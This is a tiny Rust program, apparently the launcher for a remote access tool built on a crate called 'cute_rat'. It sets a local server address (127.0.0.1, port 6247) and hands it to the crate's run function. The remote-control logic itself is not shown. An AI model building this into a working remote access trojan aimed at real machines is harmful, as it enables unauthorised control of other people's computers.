extern crate cute_rat;

const SERVER_ADDR : &str = "127.0.0.1";
const SERVER_PORT : u16 = 6247;

fn main() {
    let full_address = format!("{}:{}", SERVER_ADDR, SERVER_PORT);
    cute_rat::run(&full_address);
}

